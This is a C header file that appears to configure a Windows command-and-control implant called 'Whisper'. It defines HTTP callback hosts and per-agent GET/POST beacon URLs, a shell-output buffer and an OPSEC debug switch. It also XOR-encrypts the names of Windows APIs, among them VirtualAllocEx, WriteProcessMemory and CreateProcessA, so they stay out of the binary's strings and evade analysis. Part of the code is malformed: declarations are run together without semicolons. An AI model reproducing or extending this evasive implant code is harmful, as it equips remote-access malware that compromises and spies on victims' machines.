#pragma once

#include <windows.h> //for funcs section, like BYTE def, etc.

/*
A set of macro settings for modifying behavior
*/

#ifndef PIPE_READ_SIZE_BUFFER
// How big of an output buffer to read from CLI when running CLI-based commands
// Applies to:
//   - shell
#define PIPE_READ_SIZE_BUFFER 1024
#endif // ? Fixed: No extra tokens

#ifndef CLI_INPUT_SIZE_BUFFER
// How big of an input a command-line command can be. If your command is bigger than CLI_INPUT_SIZE_BUFFER, it'll be cut off.
// Applies to:
//   - shell
#define CLI_INPUT_SIZE_BUFFER 4096
#endif // ? Fixed

#ifndef PROCESS_SPAWN_DIRECTORY
// What directory to run a new process from. Need to explicitly specify PROCESS_SPAWN_DIRECTORY for lpCurrentDirectory when calling WhisperCreateProcessA
// Applies to:
//   - shell
//   - Can be used for anything using WhisperCreateProcessA
#define PROCESS_SPAWN_DIRECTORY "C:\\"
#endif // ? Fixed

//================
// CALLBACK
//================

#ifndef CALLBACK_SLEEP_TIME
// Sleep time (seconds)
#define CALLBACK_SLEEP_TIME 60
#endif

#ifndef CALLBACK_HTTP_HOST
// IP/Hostname of Callback.
#define CALLBACK_HTTP_HOST "MACRO_CALLBACK_ADDRESS"
#endif

#ifndef CALLBACK_HTTP_URL
// URL of callback host. seperate from HOST for formatting purposes.
// Applies to:
#define CALLBACK_HTTP_URL "http://MACRO_CALLBACK_ADDRESS/"
#endif

#ifndef CALLBACK_HTTP_PORT
// What port to post back to
// Applies to:
#define CALLBACK_HTTP_PORT MACRO_CALLBACK_PORT
#endif

#ifndef CALLBACK_HTTP_GET_ENDPOINT
// GET request endpoint
// Applies to:
#define CALLBACK_HTTP_GET_ENDPOINT "/get/"
#endif

#ifndef CALLBACK_HTTP_FULL_GET_URL
// Full GET request URL with format specifier for dynamic agent_id injection
#define CALLBACK_HTTP_FULL_GET_URL "http://MACRO_CALLBACK_ADDRESS:MACRO_CALLBACK_PORT/get/%s"
#endif

#ifndef CALLBACK_HTTP_POST_ENDPOINT
// Endpoint to post HTTP requests back to
// Applies to:
//
#define CALLBACK_HTTP_POST_ENDPOINT "/post"
#endif

#ifndef CALLBACK_HTTP_FORMAT_POST_ENDPOINT
// Endpoint to post HTTP requests back to, format string
// Applies to:
//
#define CALLBACK_HTTP_FORMAT_POST_ENDPOINT "/post/%s"
#endif

#ifndef CALLBACK_HTTP_FULL_POST_URL
// Full GET request URL with format specifier for dynamic agent_id injection
#define CALLBACK_HTTP_FULL_POST_URL "http://MACRO_CALLBACK_ADDRESS:MACRO_CALLBACK_PORT/post/%s"
#endif

//================
// ENCRYPTION
//================
// currently unused
#ifndef ENCRYPTION_XOR_KEY
// Full GET request URL with format specifier for dynamic agent_id injection
#define ENCRYPTION_XOR_KEY 0x69 // maybe put like MACRO_ENCRYPTION_XOR_KEY then .replace in python
#endif

/*
idea:
 - macro replace the strings with an xor func,

 Ex: http://10.0.0.27:MACRO_CALLBACK_PORT/post/%s >>

 # xor would return a string, or whatever is needed
 xor(http://10.0.0.27:MACRO_CALLBACK_PORT/post/%s, KEY)

 //might hit some type conflicts

 Then, its easy to macro in XOR, or some other encryption, etc

*/

//================
// DEBUG
//================
#define DEBUG_PRINT 0 // Set to 1 for debug mode, 0 to disable
// [OPSEC: If this is on (1), plaintext debug strings will be included in the binary]

// TLDR: ChatGPT magic to make a print debug macro
#if DEBUG_PRINT
#define DEBUG_LOG(fmt, ...) printf("[DEBUG] " fmt "", ##__VA_ARGS__)
#define DEBUG_LOGW(fmt, ...) wprintf(L"[DEBUG] " fmt L"", ##__VA_ARGS__)
#define DEBUG_LOGF(stream, fmt, ...) fprintf(stream, "[DEBUG] " fmt "", ##__VA_ARGS__)
#else
#define DEBUG_LOG(fmt, ...)          // No-op (does nothing)
#define DEBUG_LOGW(fmt, ...)         // No-op (does nothing)
#define DEBUG_LOGF(stream, fmt, ...) // No-op (does nothing)
#endif

//================
// FUNCS
//================

#ifndef ENCRYPTION_FUNCTION_NAMES
/*
Encrypting function names, so they don't show up as strings in the binary.

They (technically) will show up in memory, but it shouldn't be for long. Have not
verified/extensively tested this yet

Every whisper_winapi function that dynamically resolves the function, will need
the following entries:

 - FUNC_Whisper<FUNCNAME>_ENCRYPTED_NAME: XOR'd name of the function


NOTE!!!! YOU NEED 0x00 AS A NULL TERM AT THE END OF THE NAMES, otherwise
the agent will keep reading past the name of the func.
*/

// ===============================
// OPTIONAL/DEBUG hardcoded Values:
// ===============================
// uncomment to disable the MACRO based replacement + key

// //key for unencrypting these names
// #define FUNC_ENCRYPTED_NAME_KEY 0x10
// //encrypted key name, used for finding func name in mem/keeping it out of strings
// // Encrypted function name (constant array), cannot macro an array in :(
// static const BYTE FUNC_WhisperMessageBoxA_ENCRYPTED_NAME[]  = { 0x5d, 0x75, 0x63, 0x63, 0x71, 0x77, 0x75, 0x52, 0x7f, 0x68, 0x51, 0x00 };
// static const BYTE FUNC_WhisperCreateThread_ENCRYPTED_NAME[] = { 0x53,0x62,0x75,0x71,0x64,0x75,0x44,0x78,0x62,0x75,0x71,0x74, 0x00};
// static const BYTE FUNC_CreateProcessA_ENCRYPTED_NAME[]       = { 0x53,0x62,0x75,0x71,0x64,0x75,0x40,0x62,0x7f,0x73,0x75,0x63,0x63,0x51 0x00}
// static const BYTE FUNC_ResumeThread_ENCRYPTED_NAME[]        = { 0x42,0x75,0x63,0x65,0x7d,0x75,0x44,0x78,0x62,0x75,0x71,0x74, 0x00};
// static const BYTE FUNC_VirtualAllocEx_ENCRYPTED_NAME[]      = { 0x46,0x79,0x62,0x64,0x65,0x71,0x7c,0x51,0x7c,0x7c,0x7f,0x73,0x55,0x68, 0x00};
// static const BYTE FUNC_WriteProcessMemory_ENCRYPTED_NAME[]  = { 0x47,0x62,0x79,0x64,0x75,0x40,0x62,0x7f,0x73,0x75,0x63,0x63,0x5d,0x75,0x7d,0x7f,0x62,0x69, 0x00};
// static const BYTE FUNC_CreatePipe_ENCRYPTED_NAME[]          = { 0x53,0x62,0x75,0x71,0x64,0x75,0x40,0x79,0x60,0x75, 0x00};
// static const BYTE FUNC_SetHandleInformation_ENCRYPTED_NAME[]= { 0x43,0x75,0x64,0x58,0x71,0x7e,0x74,0x7c,0x75,0x59,0x7e,0x76,0x7f,0x62,0x7d,0x71,0x64,0x79,0x7f,0x7e, 0x00};
// static const BYTE FUNC_CloseHandle_ENCRYPTED_NAME[]         = { 0x53,0x7c,0x7f,0x63,0x75,0x58,0x71,0x7e,0x74,0x7c,0x75, 0x00};
// static const BYTE FUNC_InternetOpenA_ENCRYPTED_NAME[]       = { 0x59,0x7e,0x64,0x75,0x62,0x7e,0x75,0x64,0x5f,0x60,0x75,0x7e,0x51, 0x00};
// static const BYTE FUNC_InternetConnectA_ENCRYPTED_NAME[]    = { 0x59,0x7e,0x64,0x75,0x62,0x7e,0x75,0x64,0x53,0x7f,0x7e,0x7e,0x75,0x73,0x64,0x51, 0x00};
// static const BYTE FUNC_HttpOpenRequestA_ENCRYPTED_NAME[]    = { 0x58, 0x64, 0x64, 0x60, 0x5f, 0x60, 0x75, 0x7e, 0x42, 0x75, 0x61, 0x65, 0x75, 0x63, 0x64, 0x51, 0x00 };
// static const BYTE FUNC_HttpSendRequestA_ENCRYPTED_NAME[]    = { 0x58, 0x64, 0x64, 0x60, 0x43, 0x75, 0x7e, 0x74, 0x42, 0x75, 0x61, 0x65, 0x75, 0x63, 0x64, 0x51, 0x00 };
// static const BYTE FUNC_InternetOpenUrlW_ENCRYPTED_NAME[]    = { 0x59, 0x7e, 0x64, 0x75, 0x62, 0x7e, 0x75, 0x64, 0x5f, 0x60, 0x75, 0x7e, 0x45, 0x62, 0x7c, 0x47, 0x00 };
// static const BYTE FUNC_InternetReadFile_ENCRYPTED_NAME[]    = { 0x59, 0x7e, 0x64, 0x75, 0x62, 0x7e, 0x75, 0x64, 0x42, 0x75, 0x71, 0x74, 0x56, 0x79, 0x7c, 0x75, 0x00 };
// static const BYTE FUNC_InternetCloseHandle_ENCRYPTED_NAME[] = { 0x59, 0x7e, 0x64, 0x75, 0x62, 0x7e, 0x75, 0x64, 0x53, 0x7c, 0x7f, 0x63, 0x75, 0x58, 0x71, 0x7e, 0x74, 0x7c, 0x75, 0x00 };
// static const BYTE FUNC_GetUserNameW_ENCRYPTED_NAME[]        = { 0x57, 0x75, 0x64, 0x45, 0x63, 0x75, 0x62, 0x5e, 0x71, 0x7d, 0x75, 0x47, 0x00 };
// static const BYTE FUNC_Sleep_ENCRYPTED_NAME[]               = { 0x43, 0x7c, 0x75, 0x75, 0x60, 0x00 };
// static const BYTE FUNC_WaitForSingleObject_ENCRYPTED_NAME[] = { 0x47, 0x71, 0x79, 0x64, 0x56, 0x7f, 0x62, 0x43, 0x79, 0x7e, 0x77, 0x7c, 0x75, 0x5f, 0x72, 0x7a, 0x75, 0x73, 0x64, 0x00 };
// static const BYTE FUNC_ReadFile_ENCRYPTED_NAME[]            = { 0x42, 0x75, 0x71, 0x74, 0x56, 0x79, 0x7c, 0x75, 0x00 };

// ===============================
// BUILD SYSTEM macro Values:
// Uncomment to enable build system XOR replacement
// ===============================
// key for unencrypting these names
#define FUNC_ENCRYPTED_NAME_KEY MACRO_FUNC_ENCRYPTED_NAME_KEY
// constants for each entry, XOR'd function names
static const BYTE FUNC_MessageBoxA_ENCRYPTED_NAME[] = MACRO_FUNC_MessageBoxA_ENCRYPTED_NAME static const BYTE FUNC_CreateThread_ENCRYPTED_NAME[] = MACRO_FUNC_CreateThread_ENCRYPTED_NAME static const BYTE FUNC_CreateProcessA_ENCRYPTED_NAME[] = MACRO_FUNC_CreateProcessA_ENCRYPTED_NAME static const BYTE FUNC_ResumeThread_ENCRYPTED_NAME[] = MACRO_FUNC_ResumeThread_ENCRYPTED_NAME static const BYTE FUNC_VirtualAllocEx_ENCRYPTED_NAME[] = MACRO_FUNC_VirtualAllocEx_ENCRYPTED_NAME static const BYTE FUNC_WriteProcessMemory_ENCRYPTED_NAME[] = MACRO_FUNC_WriteProcessMemory_ENCRYPTED_NAME static const BYTE FUNC_CreatePipe_ENCRYPTED_NAME[] = MACRO_FUNC_CreatePipe_ENCRYPTED_NAME static const BYTE FUNC_SetHandleInformation_ENCRYPTED_NAME[] = MACRO_FUNC_SetHandleInformation_ENCRYPTED_NAME static const BYTE FUNC_CloseHandle_ENCRYPTED_NAME[] = MACRO_FUNC_CloseHandle_ENCRYPTED_NAME static const BYTE FUNC_InternetOpenA_ENCRYPTED_NAME[] = MACRO_FUNC_InternetOpenA_ENCRYPTED_NAME static const BYTE FUNC_InternetConnectA_ENCRYPTED_NAME[] = MACRO_FUNC_InternetConnectA_ENCRYPTED_NAME static const BYTE FUNC_HttpOpenRequestA_ENCRYPTED_NAME[] = MACRO_FUNC_HttpOpenRequestA_ENCRYPTED_NAME static const BYTE FUNC_HttpSendRequestA_ENCRYPTED_NAME[] = MACRO_FUNC_HttpSendRequestA_ENCRYPTED_NAME static const BYTE FUNC_InternetOpenUrlW_ENCRYPTED_NAME[] = MACRO_FUNC_InternetOpenUrlW_ENCRYPTED_NAME static const BYTE FUNC_InternetReadFile_ENCRYPTED_NAME[] = MACRO_FUNC_InternetReadFile_ENCRYPTED_NAME static const BYTE FUNC_InternetCloseHandle_ENCRYPTED_NAME[] = MACRO_FUNC_InternetCloseHandle_ENCRYPTED_NAME static const BYTE FUNC_GetUserNameW_ENCRYPTED_NAME[] = MACRO_FUNC_GetUserNameW_ENCRYPTED_NAME static const BYTE FUNC_Sleep_ENCRYPTED_NAME[] = MACRO_FUNC_Sleep_ENCRYPTED_NAME static const BYTE FUNC_WaitForSingleObject_ENCRYPTED_NAME[] = MACRO_FUNC_WaitForSingleObject_ENCRYPTED_NAME static const BYTE FUNC_ReadFile_ENCRYPTED_NAME[] = MACRO_FUNC_ReadFile_ENCRYPTED_NAME static const BYTE FUNC_OpenProcess_ENCRYPTED_NAME[] = MACRO_FUNC_OpenProcess_ENCRYPTED_NAME;
static const BYTE FUNC_TerminateProcess_ENCRYPTED_NAME[] = MACRO_FUNC_TerminateProcess_ENCRYPTED_NAME;
static const BYTE FUNC_SuspendThread_ENCRYPTED_NAME[] = MACRO_FUNC_SuspendThread_ENCRYPTED_NAME;
static const BYTE FUNC_FormatMessageA_ENCRYPTED_NAME[] = MACRO_FUNC_FormatMessageA_ENCRYPTED_NAME;
static const BYTE FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME[] = MACRO_FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME;
static const BYTE FUNC_Process32First_ENCRYPTED_NAME[] = MACRO_FUNC_Process32First_ENCRYPTED_NAME;
static const BYTE FUNC_Process32Next_ENCRYPTED_NAME[] = MACRO_FUNC_Process32Next_ENCRYPTED_NAME;
static const BYTE FUNC_GetFileSize_ENCRYPTED_NAME[] = MACRO_FUNC_GetFileSize_ENCRYPTED_NAME;
static const BYTE FUNC_DeleteFileA_ENCRYPTED_NAME[] = MACRO_FUNC_DeleteFileA_ENCRYPTED_NAME;
static const BYTE FUNC_WriteFile_ENCRYPTED_NAME[] = MACRO_FUNC_WriteFile_ENCRYPTED_NAME;
static const BYTE FUNC_MoveFileA_ENCRYPTED_NAME[] = MACRO_FUNC_MoveFileA_ENCRYPTED_NAME;
static const BYTE FUNC_CopyFileA_ENCRYPTED_NAME[] = MACRO_FUNC_CopyFileA_ENCRYPTED_NAME;
static const BYTE FUNC_FindFirstFileW_ENCRYPTED_NAME[] = MACRO_FUNC_FindFirstFileW_ENCRYPTED_NAME;
static const BYTE FUNC_FindNextFileW_ENCRYPTED_NAME[] = MACRO_FUNC_FindNextFileW_ENCRYPTED_NAME;
static const BYTE FUNC_FindClose_ENCRYPTED_NAME[] = MACRO_FUNC_FindClose_ENCRYPTED_NAME;
static const BYTE FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME[] = MACRO_FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME;
static const BYTE FUNC_CreateDirectoryA_ENCRYPTED_NAME[] = MACRO_FUNC_CreateDirectoryA_ENCRYPTED_NAME;
static const BYTE FUNC_RemoveDirectoryA_ENCRYPTED_NAME[] = MACRO_FUNC_RemoveDirectoryA_ENCRYPTED_NAME;
static const BYTE FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME[] = MACRO_FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME;
static const BYTE FUNC_CreateFileA_ENCRYPTED_NAME[] = MACRO_FUNC_CreateFileA_ENCRYPTED_NAME;

/*
Note on .dll's, they can be XOR'd but you have to convert them to WCHAR cuz REsolveFunctin takes that

Kernel32.dll is common enough that it's fine being unencryped, others might
benefit from it.

I'm leaving it for now, so kernel32.dll/others, will show up in strings

*/

#endif // ENCRYPTION_FUNCTION_NAMES
